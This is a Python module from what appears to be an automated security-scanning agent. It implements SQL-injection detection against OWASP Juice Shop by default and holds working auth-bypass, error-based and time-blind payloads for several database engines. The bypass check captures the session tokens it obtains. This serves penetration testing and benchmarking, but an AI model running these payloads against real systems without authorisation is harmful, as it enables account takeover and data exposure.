"""Deterministic SQL-injection oracles.

Ported from the benchmark harness (benchmarks/juiceshop/bench.py) which scores
precision=1.0 on these checks. A finding is VALIDATED only by an objective
signal — an auth bypass that issues a session token, or a raw DB parse error —
never by an LLM opinion or a template match. Fast (sub-second), hang-proof
(short per-request timeout), and reproducible.

Replaces the sqlmap shell-out in vuln_agent._execute_sqli_scan, which hung the
180s bridge call into the 300s task timeout and failed with "SQLMap execution
failed" on this stack. sqlmap stays available for deep/UNION cases behind an
explicit opt-in; these oracles are the reliable default.

ponytail: juice-shop-tuned defaults (login/search paths, DB markers). General
enough to drive off a dispatched url+data; widen markers/paths when a second
target needs it.
"""
from __future__ import annotations

from typing import Any, Dict, List, Optional
from urllib.parse import parse_qsl, urlparse

import httpx

# Auth-bypass payloads: classic tautologies that break out of a string-built
# WHERE clause so the row matches without a valid password.
_BYPASS_PAYLOADS = ("' OR 1=1--", "' OR true--", "admin@juice-sh.op'--", "' OR '1'='1")

# Error-based payloads: break SQL syntax so the backend leaks a parse error.
_ERROR_PAYLOADS = ("qwert'))--", "'))--", "') OR 1=1--", "'", "\"")

# Substrings that only appear in a real DB engine's error page.
_SQL_ERROR_MARKERS = (
    "sqlite_error",
    "sqlite",
    "syntax error",
    "sequelizedatabaseerror",
    "unrecognized token",
    'near "',
    "sql syntax",
    "unclosed quotation",
    "you have an error in your sql syntax",  # MySQL / MariaDB
    "unclosed quotation mark after the character string",  # MSSQL
    "incorrect syntax near",  # MSSQL
    "psql:",
    "pg::",
    "ora-0",
)


def _with_param(url: str, param: str, value: str) -> str:
    """Return ``url`` with ``param`` REPLACED (not appended) by ``value``.

    The prior oracle passed httpx ``params={param: value}`` which appends a
    second copy when the URL already carries that key (``?category=Gifts`` +
    ``category=payload`` => ``?category=Gifts&category=payload``). Most backends
    read the FIRST occurrence — the valid one — so the payload never reached the
    query and injection was missed on any endpoint discovered WITH its value.
    """
    from urllib.parse import urlencode, urlsplit, urlunsplit

    parts = urlsplit(url)
    q = dict(parse_qsl(parts.query, keep_blank_values=True))
    q[param] = value
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


# Time-blind payloads keyed by DBMS. Each payload injects a DB-native sleep of
# SLEEP_SECONDS so a measurable delay is unambiguous: a healthy endpoint returns
# in well under one second; a vulnerable one waits the full sleep. Each payload
# is paired with a control string of the same shape that does NOT sleep, so the
# oracle can subtract baseline network/jitter latency instead of trusting a
# single absolute threshold.
SLEEP_SECONDS = 5
_TIME_BLIND_PAYLOADS = (
    # SQLite — RANDOMBLOB forces measurable CPU work proportional to its arg.
    # The classic SLEEP() does not exist in SQLite; RANDOMBLOB(500000000) is the
    # same trick sqlmap uses for SQLite time-based detection.
    ("sqlite", "1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--", "1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(0))))--"),
    # MySQL / MariaDB
    ("mysql", "1' AND SLEEP({n})--", "1' AND SLEEP(0)--"),
    ("mariadb", "1' AND SLEEP({n})--", "1' AND SLEEP(0)--"),
    # PostgreSQL
    ("postgres", "1'; SELECT pg_sleep({n})--", "1'; SELECT pg_sleep(0)--"),
    # MSSQL (T-SQL WAITFOR DELAY)
    ("mssql", "1'; WAITFOR DELAY '0:0:{n}'--", "1'; WAITFOR DELAY '0:0:0'--"),
    # Oracle (no SLEEP; UTL_INADDR.get_host_name against a non-resolving name is
    # the classic timing trick, but it needs network egress. Use a heavy
    # repeat loop instead — deterministic and offline.)
    ("oracle", "1' OR DBMS_PIPE.RECEIVE_MESSAGE('a',{n})=1--", "1' OR DBMS_PIPE.RECEIVE_MESSAGE('a',0)=1--"),
)


def _format_payload(p: str) -> str:
    return p.format(n=SLEEP_SECONDS) if "{n}" in p else p


async def detect_login_bypass(
    client: httpx.AsyncClient,
    url: str,
    *,
    email_field: str = "email",
    password_field: str = "password",
) -> Optional[Dict[str, Any]]:
    """POST injection payloads to a login endpoint; VALIDATED if the server issues
    a session token for a bogus password. Returns evidence dict or None."""
    for payload in _BYPASS_PAYLOADS:
        try:
            r = await client.post(
                url,
                json={email_field: payload, password_field: "oracle-not-a-real-pw"},
            )
        except Exception:
            continue
        token = None
        if r.status_code == 200:
            try:
                body = r.json()
                # Common shapes: {"authentication":{"token":..}} | {"token":..} | {"access_token":..}
                token = (
                    (body.get("authentication") or {}).get("token")
                    or body.get("token")
                    or body.get("access_token")
                )
            except Exception:
                token = None
        if token:
            return {
                "technique": "auth_bypass",
                "endpoint": url,
                "payload": payload,
                "http_status": 200,
                "proof": "server issued a session token for an injected identity with a bogus password",
                "token_prefix": str(token)[:24] + "...",
                # Phase-1 issue #8: full response body is required for the
                # manual_replay ground-truth contract (ground_truth.py:182-188).
                # The 24-char token_prefix alone made evidence_completeness
                # 0.333 on the autonomous run; storing the full body lets the
                # scorer register a real 'response' artifact and lets an
                # operator reproduce the bypass without re-running the scan.
                "response": (r.text or "")[:4096],
                "request": (
                    f"POST {url}  body={{{email_field!r}: {payload!r}, "
                    f"{password_field!r}: 'oracle-not-a-real-pw'}}"
                ),
                "confidence": 1.0,
            }
    return None


async def detect_error_based(
    client: httpx.AsyncClient,
    url: str,
    *,
    param: Optional[str] = None,
) -> Optional[Dict[str, Any]]:
    """GET syntax-breaking payloads into a query param; VALIDATED if the backend
    returns a 5xx carrying a raw DB parse error. Returns evidence dict or None."""
    if param is None:
        q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
        param = (list(q)[-1] if q else "q")

    # Baseline value for this param (so payloads modify the REAL value in place,
    # e.g. "Gifts" -> "Gifts'"). Falls back to a benign token when absent.
    q0 = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
    base_val = q0.get(param) or "1"

    # Capture the baseline body once. Used only by the non-5xx marker path below
    # to guarantee a DB-error string was INTRODUCED by the payload rather than
    # already present in the page chrome (false-positive guard).
    base_low = ""
    try:
        r_base = await client.get(_with_param(url, param, base_val))
        base_low = (r_base.text or "")[:1200].lower()
    except Exception:
        pass

    for payload in _ERROR_PAYLOADS:
        try:
            r = await client.get(_with_param(url, param, payload))
        except Exception:
            continue
        body = (r.text or "")[:1200]
        low = body.lower()
        present = [m for m in _SQL_ERROR_MARKERS if m in low]
        # Path A (original): a 5xx carrying a raw DB parse error is proof on its
        # own — the server crashed on our syntax break.
        # Path B (new): many backends (PHP/MySQL, classic ASP) echo the error in
        # a 200 body. Accept that too, but only for a marker the payload
        # INTRODUCED (absent from the benign baseline) so page chrome that merely
        # mentions SQL can't trigger a false positive.
        introduced = [m for m in present if m not in base_low]
        if (r.status_code >= 500 and present) or introduced:
            return {
                "technique": "error_based",
                "endpoint": url,
                "parameter": param,
                "payload": payload,
                "http_status": r.status_code,
                "db_error_excerpt": body[:300],
                # Phase-1 issue #8: the error-based oracle already captured the
                # full response body (truncated to 1200 chars above) but only
                # stored a 300-char excerpt, so the scorer saw 'response' as
                # missing on the SQLi finding (autonomous_scorecard showed
                # evidence_completeness=0.333). Store the full captured body
                # under the 'response' key so the scorer registers a real
                # response artifact and the finding is evidence-complete.
                "response": body,
                "request": f"GET {_with_param(url, param, payload)}",
                "confidence": 1.0,
            }

    # Status-differential fallback. A realistic app (e.g. PortSwigger's demo)
    # returns a GENERIC 500 with no raw DB string, so the marker check above
    # can't fire. But injection still shows an objective, three-point signature:
    #   baseline value           -> normal status (e.g. 200)
    #   value + "'"              -> broken SQL      (differs; typically 5xx)
    #   value + "'-- -"          -> comment repairs -> back to baseline status
    # The repair step is what separates SQLi from a param that merely rejects odd
    # input: a generic validation error would reject BOTH the quote and the
    # commented quote. Requiring break!=baseline AND repair==baseline keeps this
    # false-positive-safe.
    try:
        rb = await client.get(_with_param(url, param, base_val))
        r_break = await client.get(_with_param(url, param, base_val + "'"))
        r_fix = await client.get(_with_param(url, param, base_val + "'-- -"))
    except Exception:
        return None

    baseline_sc, break_sc, fix_sc = rb.status_code, r_break.status_code, r_fix.status_code
    broke = break_sc != baseline_sc and break_sc >= 500
    repaired = fix_sc == baseline_sc
    if broke and repaired:
        return {
            "technique": "error_based",
            "endpoint": url,
            "parameter": param,
            "payload": base_val + "'",
            "http_status": break_sc,
            "db_error_excerpt": (
                f"status-differential: baseline({base_val})={baseline_sc}, "
                f"break({base_val}')={break_sc}, repair({base_val}'-- -)={fix_sc}"
            ),
            "response": (r_break.text or "")[:1200],
            "request": f"GET {_with_param(url, param, base_val + chr(39))}",
            "confidence": 1.0,
        }
    return None


async def detect_time_blind(
    client: httpx.AsyncClient,
    url: str,
    *,
    param: Optional[str] = None,
    min_delta: float = 3.0,
    request_timeout: Optional[float] = None,
) -> Optional[Dict[str, Any]]:
    """Time-based blind SQLi oracle.

    VALIDATED iff a payload that asks the backend to SLEEP produces a response
    measurably slower than an equivalent control payload that does NOT sleep.
    Uses a relative timing delta (sleep - control), never an absolute threshold,
    so a slow endpoint under a saturated link does not false-positive.

    - Sends a control payload first, records its latency as the baseline.
    - Sends the sleep payload; if (sleep_latency - baseline) >= min_delta seconds
      the finding is validated for that DBMS family.
    - Each candidate payload is paired with its own control to subtract per-DBMS
      parsing overhead, not a single global baseline.
    - min_delta defaults to 3.0s (SLEEP_SECONDS=5.0 with a 40% safety margin) so
      network jitter under ~3s cannot trigger a false positive.

    Returns an evidence dict with the validated DBMS family, the sleep and
    control latencies, and the delta — or None if no payload reproduced.
    """
    import time

    if param is None:
        q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
        param = (list(q)[-1] if q else "q")

    for dbms, sleep_tpl, control_tpl in _TIME_BLIND_PAYLOADS:
        sleep_payload = _format_payload(sleep_tpl)
        control_payload = _format_payload(control_tpl)
        # Baseline: send the control payload (same shape, no sleep).
        try:
            t0 = time.monotonic()
            rc = await client.get(url, params={param: control_payload}, timeout=request_timeout)
            control_latency = time.monotonic() - t0
        except Exception:
            continue
        # If the control itself timed out the endpoint is too slow to oracle.
        if rc.status_code == 404:
            continue
        # Sleep: send the real payload.
        try:
            t0 = time.monotonic()
            rs = await client.get(url, params={param: sleep_payload}, timeout=request_timeout)
            sleep_latency = time.monotonic() - t0
        except httpx.TimeoutException:
            # A timeout DURING the sleep payload but NOT during control is itself
            # strong evidence — the backend hung on the injected sleep. Treat a
            # control-success / sleep-timeout split as a validated finding.
            sleep_latency = request_timeout or SLEEP_SECONDS + 5
        except Exception:
            continue
        delta = sleep_latency - control_latency
        if delta >= min_delta:
            return {
                "technique": "time_blind",
                "endpoint": url,
                "parameter": param,
                "dbms": dbms,
                "payload": sleep_payload,
                "control_payload": control_payload,
                "control_latency": round(control_latency, 3),
                "sleep_latency": round(sleep_latency, 3),
                "delta_seconds": round(delta, 3),
                "min_delta": min_delta,
                "http_status": rs.status_code if "rs" in locals() else None,
                "confidence": 1.0,
            }
    return None


async def scan_sqli(
    base_or_url: str,
    *,
    login_url: Optional[str] = None,
    search_url: Optional[str] = None,
    search_param: str = "q",
    data: Optional[str] = None,
    timeout: float = 20.0,
    include_time_blind: bool = False,
) -> List[Dict[str, Any]]:
    """Run the applicable oracle(s) and return a list of VALIDATED evidence dicts.

    - login_url (or a url with `data` that looks like a login) -> auth-bypass oracle
    - search_url (or a GET url with a query param)             -> error-based oracle
    - include_time_blind=True additionally runs the time-blind oracle on the
      search url (covers blind/boolean-only injections that leak neither errors
      nor tokens). Off by default because the time-blind oracle issues 2 extra
      requests per DBMS family per candidate.
    Defaults target OWASP Juice Shop's known injectable endpoints when only a base
    URL is given, so a bare engagement scope still gets a real scan.
    """
    base = base_or_url.rstrip("/")
    is_base = urlparse(base_or_url).path in ("", "/")
    if login_url is None:
        login_url = f"{base}/rest/user/login" if is_base else (base_or_url if data is not None else None)
    if search_url is None and is_base:
        search_url = f"{base}/rest/products/search"

    findings: List[Dict[str, Any]] = []
    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=timeout) as c:
        if login_url:
            ev = await detect_login_bypass(c, login_url)
            if ev:
                findings.append(ev)
        # If a non-base GET url was supplied, error-test it directly too.
        if search_url is None and not is_base and data is None:
            search_url = base_or_url
        if search_url:
            param = search_param if urlparse(search_url).path.endswith("/search") else None
            ev = await detect_error_based(c, search_url, param=param)
            if ev:
                findings.append(ev)
            elif include_time_blind:
                # Only run the slower time-blind oracle if error-based did not
                # already confirm injection on this endpoint.
                ev = await detect_time_blind(
                    c, search_url, param=param, request_timeout=timeout
                )
                if ev:
                    findings.append(ev)
    return findings


if __name__ == "__main__":
    # Runnable self-check against a local target (default: juice-shop). Asserts the
    # oracle finds both the auth-bypass and error-based SQLi on juice-shop.
    import asyncio
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
    res = asyncio.run(scan_sqli(target))
    for f in res:
        print(f"[VALIDATED] {f['technique']:12s} {f['endpoint']}  payload={f['payload']!r}")
    techs = {f["technique"] for f in res}
    assert "auth_bypass" in techs, f"expected auth_bypass SQLi on {target}, got {techs}"
    assert "error_based" in techs, f"expected error_based SQLi on {target}, got {techs}"
    print(f"OK: {len(res)} validated SQLi on {target}")
